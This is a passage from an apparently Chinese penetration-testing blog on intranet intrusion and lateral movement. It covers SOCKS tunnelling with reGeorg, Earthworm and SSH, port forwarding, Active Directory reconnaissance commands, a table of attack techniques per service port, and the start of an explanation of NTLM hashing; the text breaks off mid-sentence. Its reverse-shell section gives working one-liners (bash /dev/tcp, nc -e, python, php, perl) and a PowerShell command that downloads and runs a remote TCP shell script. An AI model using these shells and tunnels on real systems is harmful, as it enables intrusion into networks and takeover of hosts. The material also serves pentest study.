title="reGeorg+Proxychains"></a>reGeorg+Proxychains</h2><p>主要是把内网服务器的端口通过http/https隧道转发到本机。</p><p>上传reGeorg的tunnel.jsp到web主机A</p><p>主机B：<code>python reGeorgSocksProxy.py -p 1080 -u http://192.168.153.137/tunnel.jsp</code></p><p>使用设置proxychains的代理端口，进行访问，一般配合nmap和metasploit进行后续内网渗透。</p><p>Ps：socks4版本协议不支持udp和icmp协议，所以使用nmap要加上-sT -Pn即使用tcp协议且不使用icmp协议。</p><h2 id="Earthworm-Proxychains"><a href="#Earthworm-Proxychains" class="headerlink" title="Earthworm+Proxychains"></a>Earthworm+Proxychains</h2><h3 id="反弹socks5服务器"><a href="#反弹socks5服务器" class="headerlink" title="反弹socks5服务器"></a>反弹socks5服务器</h3><p>当目标网络边界不存在公网IP，通过反弹方式创建socks代理。</p><p>先在一台具有公网 ip 的主机A上运行以下命令</p><p><code>./ew_for_linux64 -s rcsocks -l 1080 -e 8888</code></p><p>意思是在我们公网VPS上添加一个转接隧道，把1080端口收到的代理请求转交给8888端口</p><p>在目标主机B上启动SOCKS5服务 并反弹到公网主机的8888端口</p><p><code>ew_for_Win.exe -s rssocks -d 192.168.153.129(VPS) -e 8888</code></p><p>本地主机（192.168.153.129）然后通过添加公网192.168.153.129:1080这个代理,来访问内网机器（192.168.153.129）</p><h3 id="二级网络环境（有公网IP）"><a href="#二级网络环境（有公网IP）" class="headerlink" title="二级网络环境（有公网IP）"></a>二级网络环境（有公网IP）</h3><p>假设我们获得了右侧A主机和B主机的控制权限，A主机配有2块网卡，一块10.129.72.168连通外网，一块192.168.153.140只能连接内网B主机，无法访问内网其它资源。B主机可以访问内网资源，但无法访问外网。</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1606876288_5fc6fc80d5cb1db233661.png!small" alt="img"></p><p>先上传ew到B主机，利用ssocksd方式启动8888端口的SOCKS代理，命令如下<code>ew_for_Win.exe -s ssocksd -l 8888</code></p><p>A主机执行：<code>ew_for_Win.exe -s lcx_tran -l 1080 -f 192.168.153.138 -g 8888</code>(将1080端口收到的代理请求转交给B主机（192.168.153.138）的8888端口)</p><p>MyPc就可以通过A的外网代理10.129.72.168:1080访问B。</p><h3 id="二级网络（无公网IP）"><a href="#二级网络（无公网IP）" class="headerlink" title="二级网络（无公网IP）"></a>二级网络（无公网IP）</h3><p>假设我们获得了右侧A主机和B主机的控制权限，A主机（NAT）没有公网IP，也无法访问内网资源。B主机可以访问内网资源，但无法访问外网。</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1606876319_5fc6fc9f5e6fcab88b21d.png!small" alt="img"></p><ol><li><p> 在公网vps（45.xxx.xxx.72）添加转接隧道，将10800端口收到的代理请求转交给8888端口<code>./ew_for_linux64 -s lcx_listen -l 10800 -e 8888</code></p></li><li><p>B主机（192.168.153.138）主机正向开启9999端口</p><p> <code>./ew_for_Win.exe -s ssocksd -l 9999</code></p></li><li><p>A主机利用lcx_slave方式，将公网VPS的888端口和B主机的999端口连接起来</p><p> <code>./ew_for_Win.exe -s lcx_slave -d 45.xxx.xxx.72 -e 8888 -f 192.168.153.138 -g 9999</code></p></li></ol><p>现在MyPC可通过访问45.xxx.xxx.72:10800来使用192.168.153.138主机提供的socks5代理，代理成功，vps会有rssocks cmd_socket OK!提示</p><h2 id="SSH隧道代理转发"><a href="#SSH隧道代理转发" class="headerlink" title="SSH隧道代理转发"></a>SSH隧道代理转发</h2><p>sh有三个强大的端口转发命令，分别是本地转发、远程转发、动态转发。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfnN -D port remotehost</span><br><span class="line"></span><br><span class="line">参数详解：</span><br><span class="line">-C 允许压缩数据</span><br><span class="line">-q 安静模式</span><br><span class="line">-T不占用 shell</span><br><span class="line">-f 后台运行，并推荐加上 -n 参数</span><br><span class="line">-N不执行远程命令</span><br><span class="line">-g允许远端主机连接本地转发的端口</span><br><span class="line">-n把 stdin 重定向到 /dev/null (防止从 stdin 读取数据)</span><br><span class="line">-L port:host :hostport 正向代理</span><br><span class="line">//将本地机(客户机)的某个端口转发到远端指定机器的指定端口</span><br><span class="line">-R port:host :hostport 反向代理</span><br><span class="line">//将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口</span><br><span class="line">-D port socks5代理</span><br><span class="line">//指定一个本地机器 <span class="string">&quot;动态&quot;</span> 应用程序端口转发</span><br></pre></td></tr></table></figure><h3 id="ssh本地转发"><a href="#ssh本地转发" class="headerlink" title="ssh本地转发"></a>ssh本地转发</h3><p>本地转发（local forwarding）指的是，SSH 服务器作为中介的跳板机，建立本地计算机与特定目标网站之间的加密连接。本地转发是在本地计算机的 SSH 客户端建立的转发规则。</p><p>它会指定一个本地端口（local-port），所有发向那个端口的请求，都会转发到 SSH 跳板机（tunnel-host），然后 SSH 跳板机作为中介，将收到的请求发到目标服务器（target-host）的目标端口（target-port）。</p><p>远程管理服务器上的mysql，mysql不能直接root用户远程登陆。这时候就可以通过本地转发，通过ssh将服务器的3306端口转发到本地1234端口实现以root用户远程登陆mysql。</p><p><code>$ ssh -L local-port:target-host:target-port tunnel-host</code></p><p><code>ssh -CfNg -L 1234:127.0.0.1:3306 root@45.XX.XX.X21</code></p><p>另一例子：</p><p>假定host1是本地主机，host2是远程主机。由于种种原因，这两台主机之间无法连通。但是，另外还有一台host3，可以同时连通前面两台主机。因此，很自然的想法就是，通过host3，将host1连上host2。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在host1上：</span></span><br><span class="line">ssh -L 2121:host2:21 host3</span><br><span class="line"><span class="comment">#这样一来，我们只要连接host1的2121端口，就等于连上了host2的21端口。</span></span><br><span class="line">ftp localhost:2121</span><br></pre></td></tr></table></figure><h3 id="ssh远程转发"><a href="#ssh远程转发" class="headerlink" title="ssh远程转发"></a>ssh远程转发</h3><p>内网的服务器，外网不能直接访问，使用远程转发，将内网的服务器端口转发到外网端口。这时候访问外网的端口，就可以直接访问到了内网的端口。</p><p>将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口</p><p>既然”本地端口转发”是指绑定本地端口的转发，那么”远程端口转发”当然是指绑定远程端口的转发。</p><p>host1与host2之间无法连通，必须借助host3转发。但是，特殊情况出现了，host3是一台内网机器，它可以连接外网的host1，但是反过来就不行，外网的host1连不上内网的host3。这时，”本地端口转发”就不能用了，怎么办？</p><p>解决办法是，既然host3可以连host1，那么就从host3上建立与host1的SSH连接，然后在host1上使用这条连接就可以了。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#host3上</span></span><br><span class="line">ssh -R 2121:host2:21 host1</span><br><span class="line"><span class="comment">#就是让host1监听它自己的2121端口，然后将所有数据经由host3，转发到host2的21端口。由于对于host3来说，host1是远程主机，所以这种情况就被称为&quot;远程端口绑定&quot;。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#host1上：</span></span><br><span class="line">ftp localhost:2121</span><br></pre></td></tr></table></figure><h3 id="动态端口转发"><a href="#动态端口转发" class="headerlink" title="动态端口转发"></a>动态端口转发</h3><p>无论是本地端口转发还是远程端口转发，都是将某固定主机及其端口映射到本地或远程转发端口上，例如将host2:80映射到host1:2222。也就是说，本地或远程转发端口和目标端口所代表的应用层协议是一对一的关系，2222端口必须对应的是http的80端口，使用浏览器向host1:2222端口发起http请求当然没问题，但是使用ssh工具向host1:2222发起连接将会被拒绝，因为host2上http服务只能解析http请求，不能解析ssh连接请求。</p><p>ssh支持动态端口转发，由ssh来判断发起请求的工具使用的是什么应用层协议，然后根据判断出的协议结果决定目标端口。<br>以下图为例进行说明，host1处在办公内网，能和host3互相通信，但它无法直接和互联网和host2通信，而host3则可以和host2以及互联网通信。</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/733013-20170706233246425-1384840260.png" alt="img"></p><p>要让host1访问互联网，又能和host2的22端口即ssh服务通信，显然在host1上仅设置一个本地端口转发是不够的，虽然可以设置多个本地转发端口分别映射不同的端口，但这显然比较笨重和麻烦。使用动态端口转发即可。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在host1上</span></span><br><span class="line">ssh -Nfg -D 2222 host3</span><br></pre></td></tr></table></figure><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>尝试几个常用的</p><p>win：lcx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">监听1234端口,转发数据到2333端口</span><br><span class="line">本地:lcx.exe -listen 1234 2333</span><br><span class="line"></span><br><span class="line">将目标的3389转发到本地的1234端口</span><br><span class="line">远程:lcx.exe -slave ip 1234 127.0.0.1 3389</span><br></pre></td></tr></table></figure><p>netsh<br>只支持tcp协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">添加转发规则</span><br><span class="line">netsh interface portproxy set v4tov4 listenaddress=192.168.206.101 listenport=3333 connectaddress=192.168.206.100 connectport=3389</span><br><span class="line">此工具适用于，有一台双网卡服务器，你可以通过它进行内网通信，比如这个，你连接192.168.206.101:3388端口是连接到100上面的3389</span><br><span class="line"></span><br><span class="line">删除转发规则</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=9090</span><br><span class="line"></span><br><span class="line">查看现有规则</span><br><span class="line">netsh interface portproxy show all</span><br><span class="line"></span><br><span class="line">xp需要安装ipv6</span><br><span class="line">netsh interface ipv6 install</span><br></pre></td></tr></table></figure><p>linux :</p><p>portmap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">监听1234端口,转发数据到2333端口</span><br><span class="line">本地:./portmap -m 2 -p1 1234 -p2 2333</span><br><span class="line"></span><br><span class="line">将目标的3389转发到本地的1234端口</span><br><span class="line">./portmap -m 1 -p1 3389 -h2 ip -p2 1234</span><br></pre></td></tr></table></figure><p>iptables</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1、编辑配置文件/etc/sysctl.conf的net.ipv4.ip_forward = 1</span><br><span class="line"></span><br><span class="line">2、关闭服务</span><br><span class="line">service iptables stop</span><br><span class="line"></span><br><span class="line">3、配置规则</span><br><span class="line">需要访问的内网地址：192.168.206.101</span><br><span class="line">内网边界web服务器：192.168.206.129</span><br><span class="line">iptables -t nat -A PREROUTING --dst 192.168.206.129 -p tcp --dport 3389 -j DNAT --to-destination 192.168.206.101:3389</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING --dst 192.168.206.101 -p tcp --dport 3389 -j SNAT --to-source 192.168.206.129</span><br><span class="line"></span><br><span class="line">4、保存&amp;&amp;重启服务</span><br><span class="line">service iptables save &amp;&amp; service iptables start</span><br></pre></td></tr></table></figure><h2 id="socket代理"><a href="#socket代理" class="headerlink" title="socket代理"></a>socket代理</h2><p>Windows：xsocks，进行代理后，在windows下推荐使用Proxifier进行socket连接，规则自己定义</p><p>linux：</p><p>进行代理后，推荐使用proxychains进行socket连接</p><p>kali下的配置文件：<br>/etc/proxychains.conf<br>添加一条：socks5     127.0.0.1 8888</p><p>然后在命令前加proxychains就进行了代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl 192.168.111111</span><br></pre></td></tr></table></figure><h1 id="4-获取shell"><a href="#4-获取shell" class="headerlink" title="4.获取shell"></a>4.获取shell</h1><h2 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h2><p>常用一句话反弹shell：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.16.1.130&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/172.16.1.130/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">nc 172.16.1.130 4444 -t -e /bin/bash</span><br><span class="line"></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;172.16.1.130&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line"></span><br><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;172.16.1.130&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh \-i&quot;);&#125;;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#x27;</span>);Invoke-PowerShellTcp</span><br><span class="line">\-Reverse -IPAddress 172.16.1.130 -port 4444</span><br></pre></td></tr></table></figure><h2 id="ICMP隧道反弹shell"><a href="#ICMP隧道反弹shell" class="headerlink" title="ICMP隧道反弹shell"></a>ICMP隧道反弹shell</h2><p><a href="https://github.com/bdamele/icmpsh">工具GitHub</a></p><p>有时候防火墙可能对tcp进行来处理，然而对imcp并没有做限制的时候，可以使用icmp弹shell。</p><p>直接跑run.sh，就OK，在靶机下运行生成的命令。</p><h1 id="5-信息收集"><a href="#5-信息收集" class="headerlink" title="5.信息收集"></a>5.信息收集</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="查看当前网卡和IP信息："><a href="#查看当前网卡和IP信息：" class="headerlink" title="查看当前网卡和IP信息："></a>查看当前网卡和IP信息：</h3><p>可以看到通过查看网卡信息可以判断出当前机器是否在域内，以及是否是⼀台域机器</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317175559094.png" alt="image-20220317175559094"></p><h3 id="查看操作系统信息"><a href="#查看操作系统信息" class="headerlink" title="查看操作系统信息"></a>查看操作系统信息</h3><p><code>systeminfo</code></p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317175921095.png" alt="image-20220317175921095"></p><p>通过查看系统的详细信息我们可以判断出当前主机是一台属于域内的机器，因为在工作组环境的机器只会显示WORKGROUP，而域则会显示域地址。</p><h3 id="查看当前登陆域及域用户"><a href="#查看当前登陆域及域用户" class="headerlink" title="查看当前登陆域及域用户"></a>查看当前登陆域及域用户</h3><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317180028774.png" alt="image-20220317180028774"></p><h3 id="查看域内时间"><a href="#查看域内时间" class="headerlink" title="查看域内时间"></a>查看域内时间</h3><p><code>net time /domain</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">运行 net time /domain 该命令后，一般会有如下三种情况:</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>存在域，但当前用户不是域用户，提示说明权限不够</span><br><span class="line">  <span class="attr">C</span>:\Users&gt;bypass&gt;net time /domain</span><br><span class="line">  发生系统错误 <span class="number">5</span></span><br><span class="line">  拒绝访问。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>存在域，并且当前用户是域用户</span><br><span class="line">   <span class="attr">C</span>:\Users\Administrator&gt;net time /domain</span><br><span class="line">   \\dc.test.com 的当前时间是 <span class="number">2020</span>/<span class="number">10</span>/<span class="number">23</span> <span class="number">21</span>:<span class="number">18</span>:<span class="number">37</span></span><br><span class="line"></span><br><span class="line">   命令成功完成。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>当前网络环境为工作组，不存在域</span><br><span class="line">   <span class="attr">C</span>:\Users\Administrator&gt;net time /domain</span><br><span class="line">   找不到域 WORKGROUP 的域控制器。</span><br></pre></td></tr></table></figure><p>查找域</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317182421455.png" alt="image-20220317182421455"></p><h3 id="查找域内所有计算机"><a href="#查找域内所有计算机" class="headerlink" title="查找域内所有计算机"></a>查找域内所有计算机</h3><p><code>net view /domain GHOST</code></p><h3 id="查询域内所有用户组列表-默认13个"><a href="#查询域内所有用户组列表-默认13个" class="headerlink" title="查询域内所有用户组列表(默认13个)"></a>查询域内所有用户组列表(默认13个)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure><h3 id="查询所有域成员计算机列表"><a href="#查询所有域成员计算机列表" class="headerlink" title="查询所有域成员计算机列表"></a>查询所有域成员计算机列表</h3><p><code>net group &quot;domain computer&quot; /domain</code></p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317182701533.png" alt="image-20220317182701533"></p><h3 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a>查找域控制器</h3><p><code>nltest /dclist:ghost</code></p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317183428519.png" alt="image-20220317183428519"></p><h3 id="查看域控制器的主机名"><a href="#查看域控制器的主机名" class="headerlink" title="查看域控制器的主机名"></a>查看域控制器的主机名</h3><p><code>Nslookup -type=SRV _ldap._tcp</code></p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317183743360.png" alt="image-20220317183743360"></p><h3 id="查看域控制器"><a href="#查看域控制器" class="headerlink" title="查看域控制器"></a>查看域控制器</h3><p><code>net group &quot;domain controllers&quot; /doamin</code></p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317183912489.png" alt="image-20220317183912489"></p><h3 id="查询域管理员列表"><a href="#查询域管理员列表" class="headerlink" title="查询域管理员列表"></a>查询域管理员列表</h3><p><code>net group &quot;domain admins&quot; /domain</code></p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317184120741.png" alt="image-20220317184120741"></p><h3 id="获取所有域用户列表"><a href="#获取所有域用户列表" class="headerlink" title="获取所有域用户列表"></a>获取所有域用户列表</h3><p><code>net group &quot;domain users&quot; /domain</code></p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317184213265.png" alt="image-20220317184213265"></p><h3 id="nltest查询信任域"><a href="#nltest查询信任域" class="headerlink" title="nltest查询信任域"></a>nltest查询信任域</h3><p>信任域：可以在工作组里查询，查询内网里是否有域环境</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\yutaowin10&gt;nltest /domain_trusts /all_trusts  /v /server:192.168.188.100</span><br><span class="line">域信任的列表:</span><br><span class="line">    0: GHOST ghost.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)</span><br><span class="line">       Dom Guid: 9212c4c0-c5ea-49ff-9d48-84fa55b8d0a8</span><br><span class="line">       Dom Sid: S-1-5-21-1238213221-2393825874-2881136966</span><br><span class="line">此命令成功完成</span><br></pre></td></tr></table></figure><p>返回所有信任192.168.188.100的域</p><p><code>nltest /dsgetdc:ghost /server:192.168.188.100</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\yutaowin10&gt;nltest /dsgetdc:ghost /server:192.168.188.100</span><br><span class="line">           DC: \\WIN-4JS3YOGGQ2T</span><br><span class="line">      地址: \\192.168.188.100</span><br><span class="line">     Dom Guid: 9212c4c0-c5ea-49ff-9d48-84fa55b8d0a8</span><br><span class="line">     Dom 名称: GHOST</span><br><span class="line">  林名称: ghost.com</span><br><span class="line"> DC 站点名称: Default-First-Site-Name</span><br><span class="line">我们的站点名称: Default-First-Site-Name</span><br><span class="line">        标志: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_FOREST CLOSE_SITE FULL_SECRET</span><br><span class="line">此命令成功完成</span><br></pre></td></tr></table></figure><h2 id="端口收集"><a href="#端口收集" class="headerlink" title="端口收集"></a>端口收集</h2><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击技巧</th></tr></thead><tbody><tr><td>21/22/69</td><td>ftp/tftp：文件传输协议</td><td>爆破\嗅探\溢出\后门</td></tr><tr><td>22</td><td>ssh：远程连接</td><td>爆破OpenSSH；28个退格</td></tr><tr><td>23</td><td>telnet：远程连接</td><td>爆破\嗅探</td></tr><tr><td>25</td><td>smtp：邮件服务</td><td>邮件伪造</td></tr><tr><td>53</td><td>DNS：域名系统</td><td>DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td></tr><tr><td>67/68</td><td>dhcp</td><td>劫持\欺骗</td></tr><tr><td>110</td><td>pop3</td><td>爆破</td></tr><tr><td>139</td><td>samba</td><td>爆破\未授权访问\远程代码执行</td></tr><tr><td>143</td><td>imap</td><td>爆破</td></tr><tr><td>161</td><td>snmp</td><td>爆破</td></tr><tr><td>389</td><td>ldap</td><td>注入攻击\未授权访问</td></tr><tr><td>512/513/514</td><td>linux r</td><td>直接使用rlogin</td></tr><tr><td>873</td><td>rsync</td><td>未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破：进行内网渗透</td></tr><tr><td>1352</td><td>lotus</td><td>爆破：弱口令\信息泄漏：源代码</td></tr><tr><td>1433</td><td>mssql</td><td>爆破：使用系统用户登录\注入攻击</td></tr><tr><td>1521</td><td>oracle</td><td>爆破：TNS\注入攻击</td></tr><tr><td>2049</td><td>nfs</td><td>配置不当</td></tr><tr><td>2181</td><td>zookeeper</td><td>未授权访问</td></tr><tr><td>3306</td><td>mysql</td><td>爆破\拒绝服务\注入</td></tr><tr><td>3389</td><td>rdp</td><td>爆破\Shift后门</td></tr><tr><td>4848</td><td>glassfish</td><td>爆破：控制台弱口令\认证绕过</td></tr><tr><td>5000</td><td>sybase/DB2</td><td>爆破\注入</td></tr><tr><td>5432</td><td>postgresql</td><td>缓冲区溢出\注入攻击\爆破：弱口令</td></tr><tr><td>5632</td><td>pcanywhere</td><td>拒绝服务\代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破：弱口令\认证绕过</td></tr><tr><td>6379</td><td>redis</td><td>未授权访问\爆破：弱口令</td></tr><tr><td>7001</td><td>weblogic</td><td>Java反序列化\控制台弱口令\控制台部署webshell</td></tr><tr><td>80/443/8080</td><td>web</td><td>常见web攻击\控制台爆破\对应服务器版本漏洞</td></tr><tr><td>8069</td><td>zabbix</td><td>远程命令执行</td></tr><tr><td>9090</td><td>websphere控制台</td><td>爆破：控制台弱口令\Java反序列</td></tr><tr><td>9200/9300</td><td>elasticsearch</td><td>远程代码执行</td></tr><tr><td>11211</td><td>memcacache</td><td>未授权访问</td></tr><tr><td>27017</td><td>mongodb</td><td>爆破\未授权访问</td></tr></tbody></table><h1 id="6-Windows认证协议"><a href="#6-Windows认证协议" class="headerlink" title="6.Windows认证协议"></a>6.Windows认证协议</h1><p>Windows主要使用NTLM和kerberos认证</p><h2 id="1-NTLM认证"><a href="#1-NTLM认证" class="headerlink" title="1.NTLM认证"></a>1.NTLM认证</h2><blockquote><p>  <a href="https://zhuanlan.zhihu.com/p/79196603">NTLM认证</a></p></blockquote><p>NTLM是NT LAN Manager的缩写，NTLM是基于挑战/应答的身份验证协议，是 Windows NT 早期版本中的标准安全协议。</p><p>Windows 中是不保存明文密码的，只会保存密码的哈希值。 其中本机用户的密码哈希是放在 本地的 SAM 文件 里面，域内用户的密码哈希是存在域控的 NTDS.dit 文件 里面.</p><p>eg：<code>Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::</code></p><p>其中<code>AAD3B435B51404EEAAD3B435B51404EE</code>是LM Hash，<code>31D6CFE0D16AE931B73C59D7E0C089C0</code>是NTLM Hash。</p><p>NTLM 协议的认证过程有三步：</p><ul><li>  <strong>协商</strong>：主要用于确认双方协议版本（NTLMv1、NTLMv2等）</li><li>  <strong>质询</strong>：质询/应答 （<em>Challenge/Response</em>）模式，用于消息交换</li><li>  <strong>验证</strong>：验证身份合法性，通常由 Server端或 DC完成这个过程</li></ul><h3 id="LM-hash"><a href="#LM-hash" class="headerlink" title="LM hash"></a>LM hash</h3><p>计算方法：</p><p>1.密码转为大写，转换为16进制字符串，不足14字节将会用0来再后面补全。</p><p>2.密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</p><p>3.再分7bit为一组,每组末尾加0，再组成一组</p><p>4.上步骤得到的二组，分别作为key 为 “KGS!@#$%”进行DES加密。</p><p>5.将加密后的两组拼接在一起，得到最终LM HASH值。</p><h3 id="NTLM-hash"><a href="#NTLM-hash" class="headerlink" title="NTLM hash"></a>NTLM hash</h3><p>从Windows Vista 和 Windows Server 2008开始，默认情况下只存储 NTLM Hash，LM Hash 将不再存在。。</p><p>如果空密码或者不储蓄 LM Hash 的话，我们抓到的LM Hash是<code>AAD3B435B51404EEAAD3B435B51404EE</code>。所以在 Windows 7 中我们看到抓到 LM Hash 都是<code>AAD3B435B51404EEAAD3B435B51404EE</code>，这里的 LM Hash 已经没有任何价值了。</p><p>NTLM hash计算方法：</p><ul><li>  1.先将用户密码转换为十六进制格式。</li><li>  2.将十六进制格式的密码进行Unicode编码。</li><li>  3.使用MD4摘要算法对Unicode编码数据进行Hash计算</li></ul><p>NTLM认证分为本地认证和网络认证。</p><p>有三个版本， NTLMv1 、NTLMv2 、NTLMsession v2 三个版本，目前使用最多的是NTLMv2版本。</p><h4 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h4><p>Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在 SAM (<em>Security Account Manager 